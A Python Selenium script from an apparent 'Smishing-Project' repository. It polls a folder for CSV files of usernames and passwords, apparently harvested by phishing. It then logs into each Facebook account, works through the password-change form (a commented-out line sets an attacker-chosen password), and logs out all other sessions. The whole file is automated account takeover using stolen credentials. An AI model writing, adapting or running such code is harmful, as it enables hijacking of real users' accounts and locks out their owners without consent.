import os
import time
from selenium import webdriver
#from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
#from selenium.common.exceptions import NoSuchElementException


# Set the path to the directory where new .csv files will be created
watch_directory = '/Users/karypaquot/Documents/GitHub/Smishing-Project/scripts'

# Set the URL of the login page
login_url = 'https://www.facebook.com'

# Set the path to your web driver
driver_path = '/usr/local/bin/chromedriver'


# Create a function that logs in using the given username and password
def login(username, password):
    # Create a new instance of the Chrome browser
    driver = webdriver.Chrome(driver_path)

    # Navigate to the login page
    driver.get(login_url)

    # Enter the username and password
    input_email = driver.find_element_by_name('email')
    input_pass = driver.find_element_by_name('pass')

    input_email.clear()
    input_email.send_keys(username)
    input_pass.clear()
    input_pass.send_keys(password)

    # Submit the login form
    input_pass.submit()

    # Wait for the page to load
    time.sleep(5)
    
    # Wait for the page to load and check if the login was successful
    try:
        success_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'html._9dls.__fb-light-mode'))
        )
    except:
        # Login was unsuccessful, exit the function
        driver.quit()
        # delete the .csv file 
        os.remove(os.path.join(watch_directory, filename))
        return
    
    # Set the url to the settings page
    settings_url = 'https://www.facebook.com/settings/?tab=account'

    # navigate to the settings page
    driver.get(settings_url)

    # Wait for the page to load
    time.sleep(5)

    #set the url to the security page 
    security_url = 'https://www.facebook.com/settings?tab=security'

    #navigate to the security page 
    driver.get(security_url)

    # Wait for the page to load
    time.sleep(5)

    # locate the iframe where the html doc is 
    iframe = driver.find_elements_by_tag_name('iframe')[0]

    # switch to that frame
    driver.switch_to.frame(iframe)

    # locate the login div class inside the iframe
    login_class = driver.find_element_by_css_selector('div._1xpm._4-u2._4-u8')

    # locate the inner div class in the login div class
    inner_div = login_class.find_element_by_css_selector('div._1nfz._4-u3')

    # locate the change password table that is clickable
    clickable_table = inner_div.find_element_by_css_selector('table._4p8y.uiGrid._51mz')

    driver.execute_script("arguments[0].scrollIntoView();", clickable_table)

    # click the table to make it viewable
    clickable_table.click()

    time.sleep(3)

    # locate the password old input field 
    pass_old_id = driver.find_element_by_id('password_old')

    # send the password to the input field
    pass_old_id.send_keys(password)

    # get the new password field by id 
    input_new_password = driver.find_element_by_id('password_new')

    # set the new password
    #new_password = 'WeLove378!!'

    input_new_password.send_keys(password)
    #input_new_password.send_keys(new_password)

    # get the retype new password field bye id
    input_retype_new_password = driver.find_element_by_id('password_confirm')
    
    # set the retyped password
    input_retype_new_password.send_keys(password)

    time.sleep(5)

    # Path to finding the Save new password
    outer_div = login_class.find_element_by_css_selector('div._4p8x._4-u3')
    inner_div_1 = outer_div.find_element_by_css_selector('div._39gk')
    save_changes = inner_div_1.find_element_by_css_selector('label.submit.uiButton.uiButtonConfirm')

    # scroll to save changes button
    # driver.execute_script("arguments[0].scrollIntoView();", save_changes)

    # click save changes button
    save_changes.click()

    # LOG OUT OF ALL DEVICES 
    # locates the "where you're logged in" fragment
    connected_devices = driver.find_element_by_css_selector('div._k7f._15va._4-u2._4-u8')

    # scroll to connected devices 
    driver.execute_script("arguments[0].scrollIntoView();", connected_devices)

    time.sleep(5)
    # this is the see more label 
    see_more_label = connected_devices.find_element_by_css_selector('div._4h8e._4-u3')

    # this is the clickable label to see more logged in devices
    clickable_label = see_more_label.find_element_by_css_selector('div._42ef._8u')

    # this is the element that expands all logged in devices 
    clickable_label.click()

    # wait for page to load
    time.sleep(5)

    # need to scroll down to do this 

    # this locates the outer div to log out of all devices
    next_div = see_more_label.find_element_by_css_selector('div.clearfix')

    # this is the inner div that holds the log out of all sessions button
    log_out_all_sessions = next_div.find_element_by_css_selector('div._ohf.rfloat')

    driver.execute_script("arguments[0].scrollIntoView();", log_out_all_sessions)

    time.sleep(3)

    # click this to log out of all sessions
    log_out_all_sessions.click()

    # wait for page to load
    time.sleep(5)

    # outer container of the pop up frame
    outer_popup_frame = driver.find_element_by_css_selector('div._10.uiLayer._4-hy._3qw')

    # this is the frame that pops up after we click "log out of all sessions"
    popup_frame = outer_popup_frame.find_element_by_css_selector('div._4t2a')

    # this is the inner frame 
    inner_frame = popup_frame.find_element_by_css_selector('div._5a8u._5lnf.uiOverlayFooter')

    # this is the outer log out div element
    logout_div = inner_frame.find_element_by_css_selector('div._ohf.rfloat')

    # This is the clickable log out button
    logout_button = logout_div.find_element_by_css_selector('a.layerCancel._4jy0._4jy3._4jy1._51sy.selected._42ft')

    # click this to log out of all devices 
    logout_button.click()

    time.sleep(5)

    # Close the browser
    driver.quit()

# Set the initial list of files in the directory
before = dict ([(f, None) for f in os.listdir(watch_directory)])

while True:
    # Get the list of files in the directory
    after = dict ([(f, None) for f in os.listdir(watch_directory)])

    # Get the list of new files
    new_files = [f for f in after if not f in before]

    # Process new files
    for filename in new_files:
        # Check if the file is a .csv file
        if filename.endswith('.csv'):
            # Open the file and read the first line
            with open(os.path.join(watch_directory, filename), 'r') as f:
                lines = f.readlines()
                line = lines[1].strip()

            # Split the line into two strings
            username, password = line.split(',')

            # Log in using the username and password
            login(username, password)

    # Update the list of files in the directory
    before = after

    # Wait for 10 seconds before checking for new files again
    time.sleep(10)

